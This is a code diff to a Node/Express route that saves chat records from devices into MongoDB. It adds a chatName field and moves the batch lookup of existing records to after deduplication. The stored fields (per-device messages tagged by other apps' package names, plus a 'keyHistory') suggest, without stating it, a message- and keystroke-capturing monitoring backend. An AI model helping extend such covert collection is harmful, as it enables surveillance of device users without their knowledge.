@@ -24,12 +24,14 @@ router.post('/', async (req, res) => {
         const db = getDb();
         const existing = await db.collection('chats').findOne({ id: chat.id });
         const iconUrl = chat.iconUrl || (existing && existing.iconUrl) || null;
+        const chatName = chat.chatName || chat.chatIdentifier || (existing && existing.chatName) || null;
         const chatDoc = {
             id: chat.id,
             deviceId: chat.deviceId || null,
             appPackage: chat.appPackage,
             appName: chat.appName,
             chatIdentifier: chat.chatIdentifier || null,
+            chatName: chatName,
             text: chat.text,
             keyHistory: chat.keyHistory || null,
             mediaUrls: chat.mediaUrls || null,
@@ -85,11 +87,6 @@ router.post('/batch', async (req, res) => {
         }
         
         const db = getDb();
-        const ids = uniqueChats.map(chat => chat.id).filter(Boolean);
-        const existingChats = ids.length
-            ? await db.collection('chats').find({ id: { $in: ids } }).toArray()
-            : [];
-        const existingIconMap = new Map(existingChats.map(c => [c.id, c.iconUrl]));
         
         // Deduplicate chats before processing
         // Strategy: Remove duplicates based on content (appPackage + text + timestamp within 5 seconds)
@@ -147,9 +144,17 @@ router.post('/batch', async (req, res) => {
                 duplicatesRemoved: duplicateIds.length
             });
         }
+
+        const ids = finalChats.map(chat => chat.id).filter(Boolean);
+        const existingChats = ids.length
+            ? await db.collection('chats').find({ id: { $in: ids } }).toArray()
+            : [];
+        const existingIconMap = new Map(existingChats.map(c => [c.id, c.iconUrl]));
+        const existingNameMap = new Map(existingChats.map(c => [c.id, c.chatName]));
         
         const operations = finalChats.map(chat => {
             const iconUrl = chat.iconUrl || existingIconMap.get(chat.id) || null;
+            const chatName = chat.chatName || chat.chatIdentifier || existingNameMap.get(chat.id) || null;
             return {
             replaceOne: {
                 filter: { id: chat.id },
@@ -159,6 +164,7 @@ router.post('/batch', async (req, res) => {
                     appPackage: chat.appPackage,
                     appName: chat.appName,
                     chatIdentifier: chat.chatIdentifier || null,
+                    chatName: chatName,
                     text: chat.text,
                     keyHistory: chat.keyHistory || null,
                     mediaUrls: chat.mediaUrls || null,
